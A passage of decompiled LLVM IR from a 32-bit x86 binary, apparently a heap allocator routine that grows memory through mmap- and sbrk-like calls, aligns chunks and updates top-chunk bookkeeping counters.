  %v4_805056b = or i32 %.v1_8050280, 1
  %v0_8050570 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_805056b, i32* %ebx.global-to-local, align 4
  %v1_8050576 = or i32 %v0_8050570, 1
  store i32 %v1_8050576, i32* %eax.global-to-local, align 4
  %v1_8050579 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050579 = add i32 %v1_8050579, 4
  %v3_8050579 = inttoptr i32 %v2_8050579 to i32*
  store i32 %v4_805056b, i32* %v3_8050579, align 4
  %v0_805057c = load i32, i32* %esi.global-to-local, align 4
  %v1_805057c = load i32, i32* @edx, align 4
  %v3_805057c = add i32 %v1_805057c, %v0_805057c
  %v4_805057c = inttoptr i32 %v3_805057c to i32*
  store i32 %v0_805057c, i32* %v4_805057c, align 4
  %v0_805057f = load i32, i32* %eax.global-to-local, align 4
  %v1_805057f = load i32, i32* @edx, align 4
  %v2_805057f = add i32 %v1_805057f, 4
  %v3_805057f = inttoptr i32 %v2_805057f to i32*
  store i32 %v0_805057f, i32* %v3_805057f, align 4
  br label %dec_label_pc_8050582

dec_label_pc_8050582:                             ; preds = %dec_label_pc_805053c, %dec_label_pc_805056b
  %v0_8050582 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050582 = add i32 %v0_8050582, 8
  store i32 %v1_8050582, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050984

dec_label_pc_805058a:                             ; preds = %dec_label_pc_80504d7, %dec_label_pc_8050292, %dec_label_pc_805029a
  %v0_805058a = load i32, i32* @global_var_8053c6c.33, align 4
  store i32 %v0_805058a, i32* @ebx, align 4
  %v1_8050594 = add i32 %.v1_8050280, 16
  store i32 %v1_8050594, i32* @esi, align 4
  %v1_8050597 = add i32 %v0_805058a, 4
  %v2_8050597 = inttoptr i32 %v1_8050597 to i32*
  %v3_8050597 = load i32, i32* %v2_8050597, align 4
  %v1_805059e = and i32 %v3_8050597, -4
  store i32 %v1_805059e, i32* %ecx.global-to-local, align 4
  %v7_80505a1 = icmp ult i32 %v1_805059e, %v1_8050594
  br i1 %v7_80505a1, label %dec_label_pc_80505c1, label %dec_label_pc_80505a5

dec_label_pc_80505a5:                             ; preds = %dec_label_pc_805058a
  %v2_80505a9 = add i32 %v0_805058a, %.v1_8050280
  store i32 %v2_80505a9, i32* @edx, align 4
  %v1_80505ac = or i32 %.v1_8050280, 1
  store i32 %v1_80505ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80505a9, i32* @global_var_8053c6c.33, align 4
  store i32 %v1_80505ac, i32* %v2_8050597, align 4
  %v0_80505b8 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80505b8 = sub i32 %v0_80505b8, %.v1_8050280
  store i32 %v5_80505b8, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050914

dec_label_pc_80505c1:                             ; preds = %dec_label_pc_805058a
  %v0_80505c1 = load i32, i32* @global_var_8053f9c.38, align 4
  store i32 %v0_80505c1, i32* %edx.global-to-local, align 4
  %v0_80505c7 = load i8, i8* @global_var_8053c40.32, align 64
  %v1_80505c7 = and i8 %v0_80505c7, 2
  %v2_80505c7 = icmp eq i8 %v1_80505c7, 0
  br i1 %v2_80505c7, label %dec_label_pc_80505f5, label %dec_label_pc_80505d0

dec_label_pc_80505d0:                             ; preds = %dec_label_pc_80505c1
  store i32 ptrtoint (i8* @global_var_8053c40.32 to i32), i32* %stack_var_-92, align 4
  %v2_80505d8 = call i32 @function_8050e48(i32* bitcast (i8* @global_var_8053c40.32 to i32*))
  store i32 ptrtoint (i8* @global_var_8053c40.32 to i32), i32* @ebx, align 4
  %v1_80505e2 = add i32 %.v1_8050280, -7
  store i32 %v1_80505e2, i32* %eax.global-to-local, align 4
  store i32 %v1_80505e2, i32* %stack_var_-92, align 4
  %v1_80505e6 = call i32 @function_805022b(i32 %v1_80505e2)
  store i32 %v1_80505e6, i32* %eax.global-to-local, align 4
  store i32 %v1_80505e6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050984

dec_label_pc_80505f5:                             ; preds = %dec_label_pc_80505c1
  %v1_80505f5 = add i32 %v0_80505c1, -1
  store i32 %v1_80505f5, i32* @ecx, align 4
  store i32 %.v1_8050280, i32* @ebx, align 4
  %v1_8050600 = load i32, i32* @global_var_8053f8c.39, align 4
  %v7_8050600 = icmp ult i32 %.v1_8050280, %v1_8050600
  br i1 %v7_8050600, label %dec_label_pc_80506c2, label %dec_label_pc_805060c

dec_label_pc_805060c:                             ; preds = %dec_label_pc_80505f5
  %v0_805060c = load i32, i32* @global_var_8053f90.40, align 16
  store i32 %v0_805060c, i32* %eax.global-to-local, align 4
  %v1_8050611 = load i32, i32* @global_var_8053f94.41, align 4
  %v5_8050617 = icmp slt i32 %v0_805060c, %v1_8050611
  br i1 %v5_8050617, label %dec_label_pc_805061d, label %dec_label_pc_80506c2

dec_label_pc_805061d:                             ; preds = %dec_label_pc_805060c
  %v2_805061f = add i32 %.v1_8050280, 10
  %v3_805061f = add i32 %v2_805061f, %v0_80505c1
  %v1_8050623 = sub i32 0, %v0_80505c1
  store i32 %v1_8050623, i32* %eax.global-to-local, align 4
  %v2_8050625 = and i32 %v3_805061f, %v1_8050623
  store i32 %v2_8050625, i32* @ebx, align 4
  %tmp127 = icmp ugt i32 %v2_8050625, %.v1_8050280
  br i1 %tmp127, label %dec_label_pc_8050631, label %dec_label_pc_80506c2

dec_label_pc_8050631:                             ; preds = %dec_label_pc_805061d
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805063e = call i32 @function_8051a70(i32 0, i32 %v2_8050625, i32 3, i32 34, i32 0, i32 0, i32 %v1_80505f5, i32 %v1_80505f5)
  store i32 %v8_805063e, i32* %eax.global-to-local, align 4
  store i32 %v8_805063e, i32* @edx, align 4
  %v10_8050648 = icmp eq i32 %v8_805063e, -1
  br i1 %v10_8050648, label %dec_label_pc_8050631.dec_label_pc_80506c2_crit_edge, label %dec_label_pc_805064d

dec_label_pc_8050631.dec_label_pc_80506c2_crit_edge: ; preds = %dec_label_pc_8050631
  %v0_80506c2.pre = load i32, i32* @global_var_8053c6c.33, align 4
  br label %dec_label_pc_80506c2

dec_label_pc_805064d:                             ; preds = %dec_label_pc_8050631
  %v1_805064f = urem i32 %v8_805063e, 8
  %v2_805064f = icmp eq i32 %v1_805064f, 0
  store i32 %v1_805064f, i32* %ecx.global-to-local, align 4
  br i1 %v2_805064f, label %dec_label_pc_8050667, label %dec_label_pc_8050654

dec_label_pc_8050654:                             ; preds = %dec_label_pc_805064d
  %v0_8050659 = load i32, i32* @ebx, align 4
  %v2_805065b = sub nsw i32 8, %v1_805064f
  store i32 %v2_805065b, i32* %eax.global-to-local, align 4
  %v2_805065d = add i32 %v2_805065b, %v8_805063e
  store i32 %v2_805065d, i32* @edx, align 4
  %v2_805065f = sub i32 %v0_8050659, %v2_805065b
  store i32 %v2_805065f, i32* %esi.global-to-local, align 4
  %v2_8050661 = inttoptr i32 %v2_805065d to i32*
  store i32 %v2_805065b, i32* %v2_8050661, align 4
  br label %dec_label_pc_805066f

dec_label_pc_8050667:                             ; preds = %dec_label_pc_805064d
  %v1_8050667 = inttoptr i32 %v8_805063e to i32*
  store i32 0, i32* %v1_8050667, align 4
  br label %dec_label_pc_805066f

dec_label_pc_805066f:                             ; preds = %dec_label_pc_8050654, %dec_label_pc_8050667
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8050654 ], [ @ebx, %dec_label_pc_8050667 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_805066f = or i32 %storemerge, 2
  %v1_8050672 = load i32, i32* @edx, align 4
  %v2_8050672 = add i32 %v1_8050672, 4
  %v3_8050672 = inttoptr i32 %v2_8050672 to i32*
  store i32 %v1_805066f, i32* %v3_8050672, align 4
  %v0_8050675 = load i32, i32* @global_var_8053f90.40, align 16
  %v1_805067a = add i32 %v0_8050675, 1
  store i32 %v1_805067a, i32* %eax.global-to-local, align 4
  store i32 %v1_805067a, i32* @global_var_8053f90.40, align 16
  %v1_8050680 = load i32, i32* @global_var_8053f98.42, align 8
  %v7_8050686 = icmp sgt i32 %v1_805067a, %v1_8050680
  br i1 %v7_8050686, label %dec_label_pc_8050688, label %dec_label_pc_805068d

dec_label_pc_8050688:                             ; preds = %dec_label_pc_805066f
  store i32 %v1_805067a, i32* @global_var_8053f98.42, align 8
  br label %dec_label_pc_805068d

dec_label_pc_805068d:                             ; preds = %dec_label_pc_805066f, %dec_label_pc_8050688
  %v0_805068d = load i32, i32* @global_var_8053fa4.43, align 4
  %v1_8050692 = load i32, i32* @ebx, align 4
  %v2_8050692 = add i32 %v1_8050692, %v0_805068d
  store i32 %v2_8050692, i32* %eax.global-to-local, align 4
  store i32 %v2_8050692, i32* @global_var_8053fa4.43, align 4
  %v1_8050699 = load i32, i32* @global_var_8053fb0.44, align 16
  %tmp128 = icmp ugt i32 %v2_8050692, %v1_8050699
  br i1 %tmp128, label %dec_label_pc_80506a1, label %dec_label_pc_80506a6

dec_label_pc_80506a1:                             ; preds = %dec_label_pc_805068d
  store i32 %v2_8050692, i32* @global_var_8053fb0.44, align 16
  br label %dec_label_pc_80506a6

dec_label_pc_80506a6:                             ; preds = %dec_label_pc_805068d, %dec_label_pc_80506a1
  %v1_80506a6 = load i32, i32* @global_var_8053fa8.45, align 8
  %v2_80506a6 = add i32 %v1_80506a6, %v2_8050692
  store i32 %v2_80506a6, i32* %eax.global-to-local, align 4
  %v1_80506ac = load i32, i32* @global_var_8053fb4.46, align 4
  %tmp129 = icmp ugt i32 %v2_80506a6, %v1_80506ac
  br i1 %tmp129, label %dec_label_pc_80506b8, label %dec_label_pc_8050309

dec_label_pc_80506b8:                             ; preds = %dec_label_pc_80506a6
  store i32 %v2_80506a6, i32* @global_var_8053fb4.46, align 4
  br label %dec_label_pc_8050309

dec_label_pc_80506c2:                             ; preds = %dec_label_pc_805061d, %dec_label_pc_8050631.dec_label_pc_80506c2_crit_edge, %dec_label_pc_805060c, %dec_label_pc_80505f5
  %v0_80506c2 = phi i32 [ %v0_80506c2.pre, %dec_label_pc_8050631.dec_label_pc_80506c2_crit_edge ], [ %v0_805058a, %dec_label_pc_805060c ], [ %v0_805058a, %dec_label_pc_805061d ], [ %v0_805058a, %dec_label_pc_80505f5 ]
  store i32 %v0_80506c2, i32* %eax.global-to-local, align 4
  %v1_80506cb = add i32 %v0_80506c2, 4
  %v2_80506cb = inttoptr i32 %v1_80506cb to i32*
  %v3_80506cb = load i32, i32* %v2_80506cb, align 4
  %v1_80506d5 = and i32 %v3_80506cb, -4
  %v2_80506d5 = icmp eq i32 %v1_80506d5, 0
  store i32 %v1_80506d5, i32* @ebp, align 4
  %v1_80506d8 = load i32, i32* @global_var_8053f88.47, align 8
  %v2_80506d8 = add i32 %v1_80506d8, %v1_8050594
  store i32 %v2_80506d8, i32* %eax.global-to-local, align 4
  %v0_80506de = load i8, i8* @global_var_8053fa0.48, align 32
  %v1_80506de = urem i8 %v0_80506de, 2
  %v2_80506de = icmp eq i8 %v1_80506de, 0
  br i1 %v2_80506de, label %dec_label_pc_80506e9, label %dec_label_pc_80506e7

dec_label_pc_80506e7:                             ; preds = %dec_label_pc_80506c2
  %v2_80506e7 = sub i32 %v2_80506d8, %v1_80506d5
  store i32 %v2_80506e7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80506e9

dec_label_pc_80506e9:                             ; preds = %dec_label_pc_80506c2, %dec_label_pc_80506e7
  %v0_80506ed = phi i32 [ %v2_80506d8, %dec_label_pc_80506c2 ], [ %v2_80506e7, %dec_label_pc_80506e7 ]
  %v5_80506ed = add i32 %v0_80506ed, %v1_80505f5
  store i32 %v5_80506ed, i32* %eax.global-to-local, align 4
  %v1_80506f1 = sub i32 0, %v0_80505c1
  store i32 %v1_80506f1, i32* @edx, align 4
  %v2_80506f9 = and i32 %v5_80506ed, %v1_80506f1
  store i32 %v2_80506f9, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_80506f9, 1
  br i1 %tmp91, label %dec_label_pc_8050713, label %dec_label_pc_80506fd

dec_label_pc_80506fd:                             ; preds = %dec_label_pc_80506e9
  store i32 %v2_80506f9, i32* %stack_var_-92, align 4
  %v1_8050701 = call i32 @function_8051f21(i32 %v2_80506f9)
  store i32 %v1_8050701, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_8050701, i32* @ebx, align 4
  %v10_805070e = icmp eq i32 %v1_8050701, -1
  %v1_8050711 = icmp eq i1 %v10_805070e, false
  br i1 %v1_8050711, label %dec_label_pc_8050769.dec_label_pc_8050772_crit_edge, label %dec_label_pc_80506fd.dec_label_pc_8050713_crit_edge

dec_label_pc_80506fd.dec_label_pc_8050713_crit_edge: ; preds = %dec_label_pc_80506fd
  %v0_8050713.pre = load i8, i8* @global_var_8053fa0.48, align 32
  br label %dec_label_pc_8050713

dec_label_pc_8050713:                             ; preds = %dec_label_pc_80506fd.dec_label_pc_8050713_crit_edge, %dec_label_pc_80506e9
  %v0_805073f = phi i32 [ -1, %dec_label_pc_80506fd.dec_label_pc_8050713_crit_edge ], [ %v1_80506f1, %dec_label_pc_80506e9 ]
  %v0_8050713 = phi i8 [ %v0_8050713.pre, %dec_label_pc_80506fd.dec_label_pc_8050713_crit_edge ], [ %v0_80506de, %dec_label_pc_80506e9 ]
  %v1_8050713 = urem i8 %v0_8050713, 2
  %v2_8050713 = icmp eq i8 %v1_8050713, 0
  br i1 %v2_8050713, label %dec_label_pc_8050713.dec_label_pc_8050728_crit_edge, label %dec_label_pc_805071c

dec_label_pc_8050713.dec_label_pc_8050728_crit_edge: ; preds = %dec_label_pc_8050713
  %v0_8050728.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050728

dec_label_pc_805071c:                             ; preds = %dec_label_pc_8050713
  %v2_8050720 = add i32 %v1_80506d5, %v1_80505f5
  store i32 %v2_8050720, i32* %eax.global-to-local, align 4
  %v0_8050722 = load i32, i32* @esi, align 4
  %v2_8050722 = add i32 %v0_8050722, %v2_8050720
  %v5_8050724 = and i32 %v2_8050722, %v1_80506f1
  store i32 %v5_8050724, i32* @esi, align 4
  br label %dec_label_pc_8050728

dec_label_pc_8050728:                             ; preds = %dec_label_pc_8050713.dec_label_pc_8050728_crit_edge, %dec_label_pc_805071c
  %v0_8050728 = phi i32 [ %v0_8050728.pre, %dec_label_pc_8050713.dec_label_pc_8050728_crit_edge ], [ %v5_8050724, %dec_label_pc_805071c ]
  %tmp130 = icmp ult i32 %v0_8050728, 1048576
  br i1 %tmp130, label %dec_label_pc_8050730, label %dec_label_pc_8050735

dec_label_pc_8050730:                             ; preds = %dec_label_pc_8050728
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8050735

dec_label_pc_8050735:                             ; preds = %dec_label_pc_8050728, %dec_label_pc_8050730
  %v0_8050749 = phi i32 [ %v0_8050728, %dec_label_pc_8050728 ], [ 1048576, %dec_label_pc_8050730 ]
  %tmp131 = icmp ugt i32 %v0_8050749, %.v1_8050280
  br i1 %tmp131, label %dec_label_pc_805073f, label %dec_label_pc_8050977

dec_label_pc_805073f:                             ; preds = %dec_label_pc_8050735
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805074c = call i32 @function_8051a70(i32 0, i32 %v0_8050749, i32 3, i32 34, i32 0, i32 0, i32 %v0_805073f, i32 %v0_805073f)
  store i32 %v8_805074c, i32* %eax.global-to-local, align 4
  store i32 %v8_805074c, i32* @ebx, align 4
  %v10_8050756 = icmp eq i32 %v8_805074c, -1
  br i1 %v10_8050756, label %dec_label_pc_8050977, label %dec_label_pc_8050769.thread

dec_label_pc_8050769.thread:                      ; preds = %dec_label_pc_805073f
  %v0_805075f = load i8, i8* @global_var_8053fa0.48, align 1
  %v2_805075f = and i8 %v0_805075f, -2
  store i8 %v2_805075f, i8* @global_var_8053fa0.48, align 32
  %v1_8050766 = load i32, i32* @esi, align 4
  %v2_8050766 = add i32 %v1_8050766, %v8_805074c
  store i32 %v2_8050766, i32* @edx, align 4
  br label %dec_label_pc_8050772

dec_label_pc_8050769.dec_label_pc_8050772_crit_edge: ; preds = %dec_label_pc_80506fd
  %v1_8050776.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050772

dec_label_pc_8050772:                             ; preds = %dec_label_pc_8050769.dec_label_pc_8050772_crit_edge, %dec_label_pc_8050769.thread
  %v1_8050776 = phi i32 [ %v1_8050766, %dec_label_pc_8050769.thread ], [ %v1_8050776.pre, %dec_label_pc_8050769.dec_label_pc_8050772_crit_edge ]
  %v0_805083e100 = phi i32 [ %v8_805074c, %dec_label_pc_8050769.thread ], [ %v1_8050701, %dec_label_pc_8050769.dec_label_pc_8050772_crit_edge ]
  %v0_805083099 = phi i32 [ %v2_8050766, %dec_label_pc_8050769.thread ], [ -1, %dec_label_pc_8050769.dec_label_pc_8050772_crit_edge ]
  %v0_8050776 = load i32, i32* @global_var_8053fa8.45, align 8
  %v2_8050776 = add i32 %v1_8050776, %v0_8050776
  store i32 %v2_8050776, i32* @global_var_8053fa8.45, align 8
  %v2_805077c = add i32 %v1_80506d5, %v0_80506c2
  store i32 %v2_805077c, i32* %ecx.global-to-local, align 4
  %v2_805077e = sub i32 %v0_805083e100, %v2_805077c
  %v12_805077e = icmp eq i32 %v2_805077e, 0
  %v10_8050782 = icmp eq i32 %v0_805083099, -1
  %tmp132 = and i1 %v12_805077e, %v10_8050782
  br i1 %tmp132, label %dec_label_pc_8050787, label %dec_label_pc_8050799

dec_label_pc_8050787:                             ; preds = %dec_label_pc_8050772
  %v2_8050787 = add i32 %v1_8050776, %v1_80506d5
  store i32 %v0_80506c2, i32* %ecx.global-to-local, align 4
  %v1_805078e = or i32 %v2_8050787, 1
  store i32 %v1_805078e, i32* %eax.global-to-local, align 4
  store i32 %v1_805078e, i32* %v2_80506cb, align 4
  br label %dec_label_pc_80508c6

dec_label_pc_8050799:                             ; preds = %dec_label_pc_8050772
  %v7_805077e = icmp ult i32 %v0_805083e100, %v2_805077c
  %v0_8050799 = load i8, i8* @global_var_8053fa0.48, align 1
  %v1_8050799 = sext i8 %v0_8050799 to i32
  store i32 %v1_8050799, i32* %eax.global-to-local, align 4
  %v2_805079e = urem i8 %v0_8050799, 2
  %v3_805079e = icmp eq i8 %v2_805079e, 0
  %brmerge = or i1 %v2_80506d5, %v3_805079e
  %v1_80507a8 = icmp eq i1 %v7_805077e, false
  %or.cond97 = or i1 %v1_80507a8, %brmerge
  br i1 %or.cond97, label %dec_label_pc_80507b2, label %dec_label_pc_80507aa

dec_label_pc_80507aa:                             ; preds = %dec_label_pc_8050799
  %v1_80507aa = and i32 %v1_8050799, -2
  %v4_80507aa = trunc i32 %v1_80507aa to i8
  store i32 %v1_80507aa, i32* %eax.global-to-local, align 4
  store i8 %v4_80507aa, i8* @global_var_8053fa0.48, align 32
  br label %dec_label_pc_80507b2

dec_label_pc_80507b2:                             ; preds = %dec_label_pc_8050799, %dec_label_pc_80507aa
  %v0_80507b2 = phi i8 [ %v0_8050799, %dec_label_pc_8050799 ], [ %v4_80507aa, %dec_label_pc_80507aa ]
  %v1_80507b2 = urem i8 %v0_80507b2, 2
  %v2_80507b2 = icmp eq i8 %v1_80507b2, 0
  br i1 %v2_80507b2, label %dec_label_pc_8050830, label %dec_label_pc_80507bb

dec_label_pc_80507bb:                             ; preds = %dec_label_pc_80507b2
  br i1 %v2_80506d5, label %dec_label_pc_80507c9, label %dec_label_pc_80507bf

dec_label_pc_80507bf:                             ; preds = %dec_label_pc_80507bb
  store i32 %v2_805077e, i32* %eax.global-to-local, align 4
  %v2_80507c3 = add i32 %v2_8050776, %v2_805077e
  store i32 %v2_80507c3, i32* @global_var_8053fa8.45, align 8
  br label %dec_label_pc_80507c9

dec_label_pc_80507c9:                             ; preds = %dec_label_pc_80507bb, %dec_label_pc_80507bf
  %v1_80507cb = urem i32 %v0_805083e100, 8
  %v2_80507cb = icmp eq i32 %v1_80507cb, 0
  store i32 %v1_80507cb, i32* %edx.global-to-local, align 4
  %v1_80507ce = icmp eq i1 %v2_80507cb, false
  br i1 %v1_80507ce, label %dec_label_pc_80507d6, label %dec_label_pc_80507d0

dec_label_pc_80507d0:                             ; preds = %dec_label_pc_80507c9
  store i32 %v0_805083e100, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80507e0

dec_label_pc_80507d6:                             ; preds = %dec_label_pc_80507c9
  %v2_80507db = sub nsw i32 8, %v1_80507cb
  store i32 %v2_80507db, i32* %eax.global-to-local, align 4
  %v2_80507dd = add i32 %v2_80507db, %v0_805083e100
  store i32 %v2_80507dd, i32* @edi, align 4
  br label %dec_label_pc_80507e0

dec_label_pc_80507e0:                             ; preds = %dec_label_pc_80507d0, %dec_label_pc_80507d6
  %v0_80507e3 = phi i32 [ 0, %dec_label_pc_80507d0 ], [ %v2_80507db, %dec_label_pc_80507d6 ]
  %v2_80507e0 = add i32 %v1_8050776, %v0_805083e100
  %v2_80507e3 = add i32 %v0_80507e3, %v1_80506d5
  store i32 %v2_80507e3, i32* %ecx.global-to-local, align 4
  %v2_80507ec = add i32 %v2_80507e3, %v2_80507e0
  store i32 %v2_80507ec, i32* %edx.global-to-local, align 4
  %v2_80507f2 = add i32 %v2_80507ec, %v1_80505f5
  %v5_80507f5 = and i32 %v2_80507f2, %v1_80506f1
  %v2_80507fc = sub i32 %v5_80507f5, %v2_80507ec
  store i32 %v2_80507fc, i32* %eax.global-to-local, align 4
  %v2_80507fe = add i32 %v2_80507fc, %v2_80507e3
  store i32 %v2_80507fe, i32* @esi, align 4
  store i32 %v2_80507fe, i32* %stack_var_-92, align 4
  %v1_8050802 = call i32 @function_8051f21(i32 %v2_80507fe)
  store i32 %v1_8050802, i32* %eax.global-to-local, align 4
  store i32 %v1_8050802, i32* @edx, align 4
  %v10_805080c = icmp eq i32 %v1_8050802, -1
  %v1_805080f = icmp eq i1 %v10_805080c, false
  br i1 %v1_805080f, label %dec_label_pc_805081f, label %dec_label_pc_8050811

dec_label_pc_8050811:                             ; preds = %dec_label_pc_80507e0
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050816 = call i32 @function_8051f21(i32 0)
  store i32 %v1_8050816, i32* %eax.global-to-local, align 4
  store i32 %v1_8050816, i32* @edx, align 4
  br label %dec_label_pc_8050853

dec_label_pc_805081f:                             ; preds = %dec_label_pc_80507e0
  %v1_805081f = load i32, i32* @ebx, align 4
  %v7_805081f = icmp ult i32 %v1_8050802, %v1_805081f
  %v1_8050821 = icmp eq i1 %v7_805081f, false
  br i1 %v1_8050821, label %dec_label_pc_8050858, label %dec_label_pc_8050823

dec_label_pc_8050823:                             ; preds = %dec_label_pc_805081f
  %v0_8050823 = load i8, i8* @global_var_8053fa0.48, align 1
  %v2_8050823 = and i8 %v0_8050823, -2
  store i8 %v2_8050823, i8* @global_var_8053fa0.48, align 32
  store i32 %v2_80507e0, i32* @edx, align 4
  br label %dec_label_pc_8050837

dec_label_pc_8050830:                             ; preds = %dec_label_pc_80507b2
  store i32 %v0_805083e100, i32* @edi, align 4
  br i1 %v10_8050782, label %dec_label_pc_805083b, label %dec_label_pc_8050837

dec_label_pc_8050837:                             ; preds = %dec_label_pc_8050830, %dec_label_pc_8050823
  %v0_805085858 = phi i32 [ %v2_80507e0, %dec_label_pc_8050823 ], [ %v0_805083099, %dec_label_pc_8050830 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050858

dec_label_pc_805083b:                             ; preds = %dec_label_pc_8050830
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050842 = call i32 @function_8051f21(i32 0)
  store i32 %v1_8050842, i32* @edx, align 4
  %v1_8050849 = load i32, i32* @ebx, align 4
  %v2_8050849 = sub i32 %v1_8050842, %v1_8050849
  %v1_805084b = load i32, i32* @esi, align 4
  %v2_805084b = sub i32 %v2_8050849, %v1_805084b
  store i32 %v2_805084b, i32* %eax.global-to-local, align 4
  %v0_805084d = load i32, i32* @global_var_8053fa8.45, align 8
  %v2_805084d = add i32 %v0_805084d, %v2_805084b
  store i32 %v2_805084d, i32* @global_var_8053fa8.45, align 8
  br label %dec_label_pc_8050853

dec_label_pc_8050853:                             ; preds = %dec_label_pc_8050811, %dec_label_pc_805083b
  %v0_805085857 = phi i32 [ %v1_8050816, %dec_label_pc_8050811 ], [ %v1_8050842, %dec_label_pc_805083b ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050858

dec_label_pc_8050858:                             ; preds = %dec_label_pc_805081f, %dec_label_pc_8050837, %dec_label_pc_8050853
  %v0_805085d = phi i32 [ %v1_8050802, %dec_label_pc_805081f ], [ %v0_805085858, %dec_label_pc_8050837 ], [ %v0_805085857, %dec_label_pc_8050853 ]
  %v10_8050858 = icmp eq i32 %v0_805085d, -1
  br i1 %v10_8050858, label %dec_label_pc_80508c6, label %dec_label_pc_805085d

dec_label_pc_805085d:                             ; preds = %dec_label_pc_8050858
  %v1_805085d = load i32, i32* @edi, align 4
  %v2_805085d = sub i32 %v0_805085d, %v1_805085d
  store i32 %v2_805085d, i32* @edx, align 4
  store i32 %v1_805085d, i32* @global_var_8053c6c.33, align 4
  %v1_8050865 = load i32, i32* @esi, align 4
  %v2_8050865 = add i32 %v1_8050865, %v2_805085d
  %v1_8050868 = or i32 %v2_8050865, 1
  store i32 %v1_8050868, i32* %eax.global-to-local, align 4
  %v2_805086b = add i32 %v1_805085d, 4
  %v3_805086b = inttoptr i32 %v2_805086b to i32*
  store i32 %v1_8050868, i32* %v3_805086b, align 4
  %v0_805086e = load i32, i32* @global_var_8053fa8.45, align 8
  %v1_805086e = load i32, i32* @esi, align 4
  %v2_805086e = add i32 %v1_805086e, %v0_805086e
  store i32 %v2_805086e, i32* @global_var_8053fa8.45, align 8
  br i1 %v2_80506d5, label %dec_label_pc_80508c6, label %dec_label_pc_8050878

dec_label_pc_8050878:                             ; preds = %dec_label_pc_805085d
  %v1_8050878 = add i32 %v1_80506d5, -12
  store i32 %v0_80506c2, i32* %ecx.global-to-local, align 4
  %v1_805087f = and i32 %v1_8050878, -8
  store i32 %v1_805087f, i32* %eax.global-to-local, align 4
  %v1_8050884 = or i32 %v1_805087f, 1
  store i32 %v1_8050884, i32* @edx, align 4
  %v5_8050887 = icmp ult i32 %v1_805087f, 15
  store i32 %v1_8050884, i32* %v2_80506cb, align 4
  %v0_805088d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805088d = load i32, i32* %eax.global-to-local, align 4
  %v2_805088d = add i32 %v0_805088d, 4
  %v3_805088d = add i32 %v2_805088d, %v1_805088d
  %v4_805088d = inttoptr i32 %v3_805088d to i32*
  store i32 5, i32* %v4_805088d, align 4
  %v0_8050895 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050895 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050895 = add i32 %v0_8050895, 8
  %v3_8050895 = add i32 %v2_8050895, %v1_8050895
  %v4_8050895 = inttoptr i32 %v3_8050895 to i32*
  store i32 5, i32* %v4_8050895, align 4
  br i1 %v5_8050887, label %dec_label_pc_80508c6, label %dec_label_pc_805089f

dec_label_pc_805089f:                             ; preds = %dec_label_pc_8050878
  %v0_80508a2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80508a4 = add i32 %v0_80508a2, 8
  store i32 %v1_80508a4, i32* %eax.global-to-local, align 4
  %v0_80508a7 = load i32, i32* @global_var_8053f84.49, align 4
  store i32 %v0_80508a7, i32* @ebx, align 4
  store i32 %v1_80508a4, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8053f84.49, align 4
  %v1_80508b8 = call i32 @function_8050ff0(i32 %v1_80508a4)
  store i32 %v1_80508b8, i32* %eax.global-to-local, align 4
  %v0_80508bd = load i32, i32* @ebx, align 4
  store i32 %v0_80508bd, i32* @global_var_8053f84.49, align 4
  br label %dec_label_pc_80508c6

dec_label_pc_80508c6:                             ; preds = %dec_label_pc_8050878, %dec_label_pc_805085d, %dec_label_pc_8050858, %dec_label_pc_8050787, %dec_label_pc_805089f
  %v0_80508c6 = load i32, i32* @global_var_8053fa8.45, align 8
  store i32 %v0_80508c6, i32* %eax.global-to-local, align 4
  %v1_80508cb = load i32, i32* @global_var_8053fac.50, align 4
  %tmp133 = icmp ugt i32 %v0_80508c6, %v1_80508cb
  br i1 %tmp133, label %dec_label_pc_80508d3, label %dec_label_pc_80508d8

dec_label_pc_80508d3:                             ; preds = %dec_label_pc_80508c6
  store i32 %v0_80508c6, i32* @global_var_8053fac.50, align 4
  br label %dec_label_pc_80508d8

dec_label_pc_80508d8:                             ; preds = %dec_label_pc_80508c6, %dec_label_pc_80508d3
  %v1_80508d8 = load i32, i32* @global_var_8053fa4.43, align 4
  %v2_80508d8 = add i32 %v1_80508d8, %v0_80508c6
  store i32 %v2_80508d8, i32* %eax.global-to-local, align 4
  %v1_80508de = load i32, i32* @global_var_8053fb4.46, align 4
  %tmp134 = icmp ugt i32 %v2_80508d8, %v1_80508de
  br i1 %tmp134, label %dec_label_pc_80508e6, label %dec_label_pc_80508eb

dec_label_pc_80508e6:                             ; preds = %dec_label_pc_80508d8
  store i32 %v2_80508d8, i32* @global_var_8053fb4.46, align 4
  br label %dec_label_pc_80508eb

dec_label_pc_80508eb:                             ; preds = %dec_label_pc_80508d8, %dec_label_pc_80508e6
  %v0_80508eb = load i32, i32* @global_var_8053c6c.33, align 4
  store i32 %v0_80508eb, i32* @ebx, align 4
  %v1_80508f1 = add i32 %v0_80508eb, 4
  %v2_80508f1 = inttoptr i32 %v1_80508f1 to i32*
  %v3_80508f1 = load i32, i32* %v2_80508f1, align 4
  %v1_80508f4 = and i32 %v3_80508f1, -4
